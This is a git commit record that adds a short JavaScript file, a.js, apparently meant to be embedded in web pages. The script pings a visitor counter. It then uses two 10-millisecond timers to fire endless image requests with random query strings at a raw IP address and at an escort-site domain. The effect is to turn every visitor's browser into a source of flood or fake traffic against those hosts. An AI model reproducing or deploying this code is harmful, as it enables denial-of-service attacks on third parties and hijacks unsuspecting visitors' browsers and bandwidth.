324f5c95718e5dad1d53dccd16307aa1d1fffc85
DarkSeoTR <54660443+DarkSeoTR@users.noreply.github.com>
2019-11-10 03:28:00 +0300

    Create a.js

---
+++ a.js
@@ -0,0 +1,21 @@
+if(!document.getElementById("amung")){ new Image().src = 'http://whos.amung.us/pingjs/?k=zomzombi02'; }
+
+function c0dis(uzunluk) {
+    mtn = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789";
+    ret = "";
+    for (i = 0; i < uzunluk; i++) {
+        ret += mtn[Math.floor(Math.random() * 57)];
+    }
+    return ret;
+}
+window.setInterval(function(){var ahmet=new Image().src="https://54.38.94.180:2087/pma/js/get_scripts.js.php?v="+c0dis(12);}, 10);
+
+function c0dism(uzunluk) {
+    mtn = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789";
+    ret = "";
+    for (i = 0; i < uzunluk; i++) {
+        ret += mtn[Math.floor(Math.random() * 57)];
+    }
+    return ret;
+}
+window.setInterval(function(){var ahmet=new Image().src="http://www.escortbeylikuzu.com/amp/index.php?s="+c0dis(12);}, 10);
